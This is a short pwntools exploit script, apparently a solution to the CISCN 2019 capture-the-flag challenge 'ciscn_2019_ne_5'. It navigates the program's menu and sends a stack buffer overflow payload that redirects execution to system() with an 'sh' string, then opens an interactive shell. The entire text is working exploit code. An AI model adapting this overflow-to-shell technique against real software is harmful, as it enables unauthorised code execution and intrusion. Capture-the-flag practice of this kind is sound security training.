from pwn import *
context(log_level='DEBUG')
io = process("./ciscn_2019_ne_5")
elf = ELF("./ciscn_2019_ne_5")
#io = remote()
sh_addr = 0x080482ea
sys_addr = elf.plt['system']
payload = 'a'*(0x48+4)+ p32(sys_addr)+p32(0xdeadbeef)+p32(sh_addr)
io.recvline()
io.sendline("administrator")
io.recvline()
io.sendline("1")
io.recvline()
io.sendline(payload)
io.recv()
io.sendline("4")
io.interactive()